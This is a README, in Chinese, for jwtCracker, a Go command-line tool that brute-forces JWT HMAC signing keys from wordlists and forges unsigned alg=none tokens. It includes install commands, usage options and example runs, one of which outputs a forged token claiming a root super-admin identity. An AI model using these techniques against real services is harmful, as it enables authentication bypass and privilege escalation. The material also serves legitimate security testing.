# 项目概述

jwtCracker是一款go语言编写的jwt常见安全问题利用工具，主要功能有：

一、暴力破解：目前支持HS256、HS384、HS512加密方式的破解，另外鉴于部分人喜欢把普通密码经过编码后再作为密钥，本程序支持对密钥进行32位md5、16位md5、base64编码后再进行暴力破解

二、生成alg=none的jwt token



## 安装

```
git clone https://github.com/alwaystest18/jwtCracker.git
cd jwtCracker/
go install
go build jwtCracker.go
```

## 用法

```
Usage: jwtCracker COMMAND [options]

encode [generate jwt token(alg=none)]
  -pf string
        path of payload file
crack [brute force jwt key]
  -em string
        encryption method of key [none(default), md5, md5_len16, base64] (default "none")
  -kf string
        path of key file
  -tf string
        path of token file
```

token文件内容示例

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.vvmEOcKCp02AUFIthrIAO-TC4XIZr782tiIbzsYyjWY
```

key文件内容示例

```
123

123456

abc

...
```

payload文件示例

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```



### 示例

1.根据字典内容暴力破解，token文件与密钥字典文件路径自行替换

```
E:\golang>jwtCracker.exe crack -tf token.txt -kf keys.txt
found key: alwaystest
Execution time:[4.637584s]
E:\golang>
```

2.对字典的值base64编码后暴力破解

```
E:\golang>jwtCracker.exe crack -tf token.txt -kf keys.txt -em base64
found key: enp6cg==
Execution time:[4.6872635s]
E:\golang>
```

3.对字典的值md5哈希后暴力破解

```
E:\golang>jwtCracker.exe crack -tf token.txt -kf keys.txt -em md5
found key: 202cb962ac59075b964b07152d234b70
Execution time:[117.999ms]
E:\golang>
```

4.对字典的值16位md5哈希后暴力破解

```
E:\golang>jwtCracker.exe crack -tf token.txt -kf keys.txt -em md5_len16
found key: ac59075b964b0715
Execution time:[126.4814ms]
E:\golang>
```

5.生成alg=none的jwt token

```
E:\golang>jwtCracker.exe encode -pf payload.txt
eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.ew0gICJpc3MiOiAiaXNzdXNlciIsDSAgImF1ZCI6ICJhdWRpZW5jZSIsDSAgInRlbmFudF9pZCI6ICIwMDAwMDAiLA0gICJyb2xlX25hbWUiOiAi6LaF57qn566h55CG5ZGYIiwNICAidXNlcl9pZCI6ICIxMDAwIiwNICAicm9sZV9pZCI6ICIxMDAwIiwNICAidXNlcl9uYW1lIjogInJvb3QiLA0gICJkZXRhaWwiOiB7DSAgICAidHlwZSI6ICJ3ZWIiLA0gICAgInN0b3JlX2lkIjogMTUzNTE1NjIxMTc4MTk5NjUwMA0gIH0sDSAgInRva2VuX3R5cGUiOiAiYWNjZXNzX3Rva2VuIiwNICAiYWNjb3VudCI6ICJyb290IiwNICAiY2xpZW50X2lkIjogInNhYmVyIiwNICAiZXhwIjogMTY3NzUxMzY3OSwNICAibmJmIjogMTY3NzM0MDg3OQ19.

E:\golang>
```

## 执行时间

测试53w行字典，真实密钥放在最后一行，6.3秒即可跑出结果(16G内存 i5的4核cpu主机)
